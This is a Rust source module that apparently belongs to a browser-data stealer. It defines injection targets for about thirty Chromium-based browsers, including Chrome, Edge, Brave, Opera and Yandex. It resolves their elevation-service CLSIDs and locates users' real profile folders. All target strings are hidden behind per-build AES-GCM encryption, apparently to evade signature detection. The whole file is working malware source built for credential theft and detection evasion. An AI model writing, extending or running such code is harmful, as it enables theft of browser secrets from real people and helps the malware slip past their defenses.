//! Chromium browser targets: exe name + user data path for injection.
//! All plaintext browser names, exe names, and CLSIDs are now decrypted at
//! runtime from AES-256-GCM encrypted constants (unique per build).

use std::collections::HashMap;
use crate::polymorphic_keys::aes_decrypt;

#[derive(Clone, Copy)]
pub enum DataRoot {
    Local,
    Roaming,
}

#[derive(Clone)]
pub struct ChromiumTarget {
    pub name: String,
    pub exe: String,
    pub user_data_rel: String,
    pub root: DataRoot,
    #[allow(dead_code)]
    pub clsid: String,
}

macro_rules! dec {
    ($ct:expr, $key:expr, $nonce:expr) => {
        String::from_utf8(aes_decrypt($ct, $key, $nonce)).unwrap_or_default()
    };
}

fn targets() -> Vec<ChromiumTarget> {
    use crate::polymorphic_keys::*;
    let chrome  = dec!(INJ_CHROME_EXE_ENC,  &INJ_CHROME_EXE_KEY,  &INJ_CHROME_EXE_NONCE);
    let edge    = dec!(INJ_EDGE_EXE_ENC,    &INJ_EDGE_EXE_KEY,    &INJ_EDGE_EXE_NONCE);
    let brave   = dec!(INJ_BRAVE_EXE_ENC,   &INJ_BRAVE_EXE_KEY,   &INJ_BRAVE_EXE_NONCE);
    let vivaldi = dec!(INJ_VIVALDI_EXE_ENC, &INJ_VIVALDI_EXE_KEY, &INJ_VIVALDI_EXE_NONCE);
    let opera   = dec!(INJ_OPERA_EXE_ENC,   &INJ_OPERA_EXE_KEY,   &INJ_OPERA_EXE_NONCE);
    let browser = dec!(INJ_BROWSER_EXE_ENC, &INJ_BROWSER_EXE_KEY, &INJ_BROWSER_EXE_NONCE);

    vec![
        ChromiumTarget { name: dec!(INJ_NAME_CHROME_ENC,       &INJ_NAME_CHROME_KEY,       &INJ_NAME_CHROME_NONCE),       exe: chrome.clone(),  user_data_rel: dec!(INJ_UD_CHROME_ENC,        &INJ_UD_CHROME_KEY,        &INJ_UD_CHROME_NONCE),        root: DataRoot::Local,   clsid: String::new() },
        ChromiumTarget { name: dec!(INJ_NAME_CHROME_BETA_ENC,  &INJ_NAME_CHROME_BETA_KEY,  &INJ_NAME_CHROME_BETA_NONCE),  exe: chrome.clone(),  user_data_rel: dec!(INJ_UD_CHROME_BETA_ENC,   &INJ_UD_CHROME_BETA_KEY,   &INJ_UD_CHROME_BETA_NONCE),   root: DataRoot::Local,   clsid: String::new() },
        ChromiumTarget { name: dec!(INJ_NAME_CHROME_DEV_ENC,   &INJ_NAME_CHROME_DEV_KEY,   &INJ_NAME_CHROME_DEV_NONCE),   exe: chrome.clone(),  user_data_rel: dec!(INJ_UD_CHROME_DEV_ENC,    &INJ_UD_CHROME_DEV_KEY,    &INJ_UD_CHROME_DEV_NONCE),    root: DataRoot::Local,   clsid: String::new() },
        ChromiumTarget { name: dec!(INJ_NAME_CHROME_CANARY_ENC,&INJ_NAME_CHROME_CANARY_KEY,&INJ_NAME_CHROME_CANARY_NONCE),exe: chrome.clone(),  user_data_rel: dec!(INJ_UD_CHROME_CANARY_ENC, &INJ_UD_CHROME_CANARY_KEY, &INJ_UD_CHROME_CANARY_NONCE), root: DataRoot::Local,   clsid: String::new() },
        ChromiumTarget { name: dec!(INJ_NAME_CHROMIUM_ENC,     &INJ_NAME_CHROMIUM_KEY,     &INJ_NAME_CHROMIUM_NONCE),     exe: chrome.clone(),  user_data_rel: dec!(INJ_UD_CHROMIUM_ENC,      &INJ_UD_CHROMIUM_KEY,      &INJ_UD_CHROMIUM_NONCE),      root: DataRoot::Local,   clsid: String::new() },
        ChromiumTarget { name: dec!(INJ_NAME_EDGE_ENC,         &INJ_NAME_EDGE_KEY,         &INJ_NAME_EDGE_NONCE),         exe: edge.clone(),    user_data_rel: dec!(INJ_UD_EDGE_ENC,          &INJ_UD_EDGE_KEY,          &INJ_UD_EDGE_NONCE),          root: DataRoot::Local,   clsid: String::new() },
        ChromiumTarget { name: dec!(INJ_NAME_EDGE_BETA_ENC,    &INJ_NAME_EDGE_BETA_KEY,    &INJ_NAME_EDGE_BETA_NONCE),    exe: edge.clone(),    user_data_rel: dec!(INJ_UD_EDGE_BETA_ENC,     &INJ_UD_EDGE_BETA_KEY,     &INJ_UD_EDGE_BETA_NONCE),     root: DataRoot::Local,   clsid: String::new() },
        ChromiumTarget { name: dec!(INJ_NAME_EDGE_DEV_ENC,     &INJ_NAME_EDGE_DEV_KEY,     &INJ_NAME_EDGE_DEV_NONCE),     exe: edge.clone(),    user_data_rel: dec!(INJ_UD_EDGE_DEV_ENC,      &INJ_UD_EDGE_DEV_KEY,      &INJ_UD_EDGE_DEV_NONCE),      root: DataRoot::Local,   clsid: String::new() },
        ChromiumTarget { name: dec!(INJ_NAME_BRAVE_ENC,        &INJ_NAME_BRAVE_KEY,        &INJ_NAME_BRAVE_NONCE),        exe: brave.clone(),   user_data_rel: dec!(INJ_UD_BRAVE_ENC,         &INJ_UD_BRAVE_KEY,         &INJ_UD_BRAVE_NONCE),         root: DataRoot::Local,   clsid: String::new() },
        ChromiumTarget { name: dec!(INJ_NAME_BRAVE_BETA_ENC,   &INJ_NAME_BRAVE_BETA_KEY,   &INJ_NAME_BRAVE_BETA_NONCE),   exe: brave.clone(),   user_data_rel: dec!(INJ_UD_BRAVE_BETA_ENC,    &INJ_UD_BRAVE_BETA_KEY,    &INJ_UD_BRAVE_BETA_NONCE),    root: DataRoot::Local,   clsid: String::new() },
        ChromiumTarget { name: dec!(INJ_NAME_BRAVE_NIGHTLY_ENC,&INJ_NAME_BRAVE_NIGHTLY_KEY,&INJ_NAME_BRAVE_NIGHTLY_NONCE),exe: brave.clone(),   user_data_rel: dec!(INJ_UD_BRAVE_NIGHTLY_ENC, &INJ_UD_BRAVE_NIGHTLY_KEY, &INJ_UD_BRAVE_NIGHTLY_NONCE), root: DataRoot::Local,   clsid: String::new() },
        ChromiumTarget { name: dec!(INJ_NAME_OPERA_ENC,        &INJ_NAME_OPERA_KEY,        &INJ_NAME_OPERA_NONCE),        exe: opera.clone(),   user_data_rel: dec!(INJ_UD_OPERA_ENC,         &INJ_UD_OPERA_KEY,         &INJ_UD_OPERA_NONCE),         root: DataRoot::Roaming, clsid: String::new() },
        ChromiumTarget { name: dec!(INJ_NAME_OPERA_GX_ENC,     &INJ_NAME_OPERA_GX_KEY,     &INJ_NAME_OPERA_GX_NONCE),     exe: opera.clone(),   user_data_rel: dec!(INJ_UD_OPERA_GX_ENC,      &INJ_UD_OPERA_GX_KEY,      &INJ_UD_OPERA_GX_NONCE),      root: DataRoot::Roaming, clsid: String::new() },
        ChromiumTarget { name: dec!(INJ_NAME_OPERA_NEON_ENC,   &INJ_NAME_OPERA_NEON_KEY,   &INJ_NAME_OPERA_NEON_NONCE),   exe: opera.clone(),   user_data_rel: dec!(INJ_UD_OPERA_NEON_ENC,    &INJ_UD_OPERA_NEON_KEY,    &INJ_UD_OPERA_NEON_NONCE),    root: DataRoot::Roaming, clsid: String::new() },
        ChromiumTarget { name: dec!(INJ_NAME_VIVALDI_ENC,      &INJ_NAME_VIVALDI_KEY,      &INJ_NAME_VIVALDI_NONCE),      exe: vivaldi.clone(), user_data_rel: dec!(INJ_UD_VIVALDI_ENC,       &INJ_UD_VIVALDI_KEY,       &INJ_UD_VIVALDI_NONCE),       root: DataRoot::Local,   clsid: String::new() },
        ChromiumTarget { name: dec!(INJ_NAME_YANDEX_ENC,       &INJ_NAME_YANDEX_KEY,       &INJ_NAME_YANDEX_NONCE),       exe: browser.clone(), user_data_rel: dec!(INJ_UD_YANDEX_ENC,        &INJ_UD_YANDEX_KEY,        &INJ_UD_YANDEX_NONCE),        root: DataRoot::Local,   clsid: String::new() },
        ChromiumTarget { name: dec!(INJ_NAME_COCCOC_ENC,       &INJ_NAME_COCCOC_KEY,       &INJ_NAME_COCCOC_NONCE),       exe: browser.clone(), user_data_rel: dec!(INJ_UD_COCCOC_ENC,        &INJ_UD_COCCOC_KEY,        &INJ_UD_COCCOC_NONCE),        root: DataRoot::Local,   clsid: String::new() },
        ChromiumTarget { name: dec!(INJ_NAME_CENT_ENC,         &INJ_NAME_CENT_KEY,         &INJ_NAME_CENT_NONCE),         exe: chrome.clone(),  user_data_rel: dec!(INJ_UD_CENT_ENC,          &INJ_UD_CENT_KEY,          &INJ_UD_CENT_NONCE),          root: DataRoot::Local,   clsid: String::new() },
        ChromiumTarget { name: dec!(INJ_NAME_360CHROME_ENC,    &INJ_NAME_360CHROME_KEY,    &INJ_NAME_360CHROME_NONCE),    exe: dec!(INJ_EXE_360CHROME_ENC, &INJ_EXE_360CHROME_KEY, &INJ_EXE_360CHROME_NONCE), user_data_rel: dec!(INJ_UD_360CHROME_ENC, &INJ_UD_360CHROME_KEY, &INJ_UD_360CHROME_NONCE), root: DataRoot::Local, clsid: String::new() },
        ChromiumTarget { name: dec!(INJ_NAME_EPIC_ENC,         &INJ_NAME_EPIC_KEY,         &INJ_NAME_EPIC_NONCE),         exe: dec!(INJ_EXE_EPIC_ENC,    &INJ_EXE_EPIC_KEY,    &INJ_EXE_EPIC_NONCE),    user_data_rel: dec!(INJ_UD_EPIC_ENC,    &INJ_UD_EPIC_KEY,    &INJ_UD_EPIC_NONCE),    root: DataRoot::Local,   clsid: String::new() },
        ChromiumTarget { name: dec!(INJ_NAME_URAN_ENC,         &INJ_NAME_URAN_KEY,         &INJ_NAME_URAN_NONCE),         exe: dec!(INJ_EXE_URAN_ENC,    &INJ_EXE_URAN_KEY,    &INJ_EXE_URAN_NONCE),    user_data_rel: dec!(INJ_UD_URAN_ENC,    &INJ_UD_URAN_KEY,    &INJ_UD_URAN_NONCE),    root: DataRoot::Local,   clsid: String::new() },
        ChromiumTarget { name: dec!(INJ_NAME_7STAR_ENC,        &INJ_NAME_7STAR_KEY,        &INJ_NAME_7STAR_NONCE),        exe: dec!(INJ_EXE_7STAR_ENC,   &INJ_EXE_7STAR_KEY,   &INJ_EXE_7STAR_NONCE),   user_data_rel: dec!(INJ_UD_7STAR_ENC,   &INJ_UD_7STAR_KEY,   &INJ_UD_7STAR_NONCE),   root: DataRoot::Local,   clsid: String::new() },
        ChromiumTarget { name: dec!(INJ_NAME_TORCH_ENC,        &INJ_NAME_TORCH_KEY,        &INJ_NAME_TORCH_NONCE),        exe: dec!(INJ_EXE_TORCH_ENC,   &INJ_EXE_TORCH_KEY,   &INJ_EXE_TORCH_NONCE),   user_data_rel: dec!(INJ_UD_TORCH_ENC,   &INJ_UD_TORCH_KEY,   &INJ_UD_TORCH_NONCE),   root: DataRoot::Local,   clsid: String::new() },
        ChromiumTarget { name: dec!(INJ_NAME_KOMETA_ENC,       &INJ_NAME_KOMETA_KEY,       &INJ_NAME_KOMETA_NONCE),       exe: dec!(INJ_EXE_KOMETA_ENC,  &INJ_EXE_KOMETA_KEY,  &INJ_EXE_KOMETA_NONCE),  user_data_rel: dec!(INJ_UD_KOMETA_ENC,  &INJ_UD_KOMETA_KEY,  &INJ_UD_KOMETA_NONCE),  root: DataRoot::Local,   clsid: String::new() },
        ChromiumTarget { name: dec!(INJ_NAME_ORBITUM_ENC,      &INJ_NAME_ORBITUM_KEY,      &INJ_NAME_ORBITUM_NONCE),      exe: dec!(INJ_EXE_ORBITUM_ENC, &INJ_EXE_ORBITUM_KEY, &INJ_EXE_ORBITUM_NONCE), user_data_rel: dec!(INJ_UD_ORBITUM_ENC, &INJ_UD_ORBITUM_KEY, &INJ_UD_ORBITUM_NONCE), root: DataRoot::Local,   clsid: String::new() },
        ChromiumTarget { name: dec!(INJ_NAME_AMIGO_ENC,        &INJ_NAME_AMIGO_KEY,        &INJ_NAME_AMIGO_NONCE),        exe: dec!(INJ_EXE_AMIGO_ENC,   &INJ_EXE_AMIGO_KEY,   &INJ_EXE_AMIGO_NONCE),   user_data_rel: dec!(INJ_UD_AMIGO_ENC,   &INJ_UD_AMIGO_KEY,   &INJ_UD_AMIGO_NONCE),   root: DataRoot::Local,   clsid: String::new() },
        ChromiumTarget { name: dec!(INJ_NAME_SPUTNIK_ENC,      &INJ_NAME_SPUTNIK_KEY,      &INJ_NAME_SPUTNIK_NONCE),      exe: dec!(INJ_EXE_SPUTNIK_ENC, &INJ_EXE_SPUTNIK_KEY, &INJ_EXE_SPUTNIK_NONCE), user_data_rel: dec!(INJ_UD_SPUTNIK_ENC, &INJ_UD_SPUTNIK_KEY, &INJ_UD_SPUTNIK_NONCE), root: DataRoot::Local,   clsid: String::new() },
        ChromiumTarget { name: dec!(INJ_NAME_SLIMJET_ENC,      &INJ_NAME_SLIMJET_KEY,      &INJ_NAME_SLIMJET_NONCE),      exe: dec!(INJ_EXE_SLIMJET_ENC, &INJ_EXE_SLIMJET_KEY, &INJ_EXE_SLIMJET_NONCE), user_data_rel: dec!(INJ_UD_SLIMJET_ENC, &INJ_UD_SLIMJET_KEY, &INJ_UD_SLIMJET_NONCE), root: DataRoot::Local,   clsid: String::new() },
        ChromiumTarget { name: dec!(INJ_NAME_IRIDIUM_ENC,      &INJ_NAME_IRIDIUM_KEY,      &INJ_NAME_IRIDIUM_NONCE),      exe: dec!(INJ_EXE_IRIDIUM_ENC, &INJ_EXE_IRIDIUM_KEY, &INJ_EXE_IRIDIUM_NONCE), user_data_rel: dec!(INJ_UD_IRIDIUM_ENC, &INJ_UD_IRIDIUM_KEY, &INJ_UD_IRIDIUM_NONCE), root: DataRoot::Local,   clsid: String::new() },
        ChromiumTarget { name: dec!(INJ_NAME_THORIUM_ENC,      &INJ_NAME_THORIUM_KEY,      &INJ_NAME_THORIUM_NONCE),      exe: dec!(INJ_EXE_THORIUM_ENC, &INJ_EXE_THORIUM_KEY, &INJ_EXE_THORIUM_NONCE), user_data_rel: dec!(INJ_UD_THORIUM_ENC, &INJ_UD_THORIUM_KEY, &INJ_UD_THORIUM_NONCE), root: DataRoot::Local,   clsid: String::new() },
        ChromiumTarget { name: dec!(INJ_NAME_ARC_ENC,          &INJ_NAME_ARC_KEY,          &INJ_NAME_ARC_NONCE),          exe: dec!(INJ_EXE_ARC_ENC,     &INJ_EXE_ARC_KEY,     &INJ_EXE_ARC_NONCE),     user_data_rel: dec!(INJ_UD_ARC_ENC,     &INJ_UD_ARC_KEY,     &INJ_UD_ARC_NONCE),     root: DataRoot::Local,   clsid: String::new() },
    ]
}

const fn fnv1a(s: &[u8]) -> u64 {
    let mut h: u64 = 0xcbf29ce484222325;
    let mut i = 0;
    while i < s.len() {
        h ^= s[i] as u64;
        h = h.wrapping_mul(0x100000001b3);
        i += 1;
    }
    h
}

fn fallback_canonical_clsid(name: &str) -> Option<String> {
    use crate::polymorphic_keys::*;
    const H_CHROME:        u64 = fnv1a(b"Chrome");
    const H_CHROME_BETA:   u64 = fnv1a(b"Chrome Beta");
    const H_CHROME_DEV:    u64 = fnv1a(b"Chrome Dev");
    const H_CHROME_CANARY: u64 = fnv1a(b"Chrome Canary");
    const H_EDGE:          u64 = fnv1a(b"Edge");
    const H_BRAVE:         u64 = fnv1a(b"Brave");
    let h = fnv1a(name.as_bytes());
    match h {
        H_CHROME        => Some(dec!(INJ_CLSID_CHROME_ENC,        &INJ_CLSID_CHROME_KEY,        &INJ_CLSID_CHROME_NONCE)),
        H_CHROME_BETA   => Some(dec!(INJ_CLSID_CHROME_BETA_ENC,   &INJ_CLSID_CHROME_BETA_KEY,   &INJ_CLSID_CHROME_BETA_NONCE)),
        H_CHROME_DEV    => Some(dec!(INJ_CLSID_CHROME_DEV_ENC,    &INJ_CLSID_CHROME_DEV_KEY,    &INJ_CLSID_CHROME_DEV_NONCE)),
        H_CHROME_CANARY => Some(dec!(INJ_CLSID_CHROME_CANARY_ENC, &INJ_CLSID_CHROME_CANARY_KEY, &INJ_CLSID_CHROME_CANARY_NONCE)),
        H_EDGE          => Some(dec!(INJ_CLSID_EDGE_ENC,          &INJ_CLSID_EDGE_KEY,          &INJ_CLSID_EDGE_NONCE)),
        H_BRAVE         => Some(dec!(INJ_CLSID_BRAVE_ENC,         &INJ_CLSID_BRAVE_KEY,         &INJ_CLSID_BRAVE_NONCE)),
        _               => Some(dec!(INJ_CLSID_CHROME_ENC,        &INJ_CLSID_CHROME_KEY,        &INJ_CLSID_CHROME_NONCE)),
    }
}

/// Returns canonical CLSIDs for browser elevation services (no registry scanning).
pub fn discover_elevation_services() -> HashMap<String, String> {
    let mut map: HashMap<String, String> = HashMap::new();
    for t in targets() {
        if let Some(c) = fallback_canonical_clsid(&t.name) {
            map.insert(t.name.clone(), c);
        }
    }
    map
}

pub fn find_target(name: &str) -> Option<ChromiumTarget> {
    let name_lower = name.to_lowercase();
    targets().into_iter().find(|t| t.name.to_lowercase() == name_lower)
}

pub fn find_real_profile_dir(browser_name: &str) -> Option<std::path::PathBuf> {
    use crate::polymorphic_keys::*;
    let local_key   = dec!(INJ_PATH_LOCALAPPDATA_ENC, &INJ_PATH_LOCALAPPDATA_KEY, &INJ_PATH_LOCALAPPDATA_NONCE);
    let roaming_key = dec!(INJ_PATH_APPDATA_ENC,      &INJ_PATH_APPDATA_KEY,      &INJ_PATH_APPDATA_NONCE);
    let local   = std::env::var(&local_key).ok()?;
    let roaming = std::env::var(&roaming_key).ok()?;
    let target  = find_target(browser_name)?;
    let base = match target.root {
        DataRoot::Local   => std::path::PathBuf::from(local),
        DataRoot::Roaming => std::path::PathBuf::from(roaming),
    };
    let profile = base.join(&target.user_data_rel);
    if profile.exists() { Some(profile) } else { None }
}
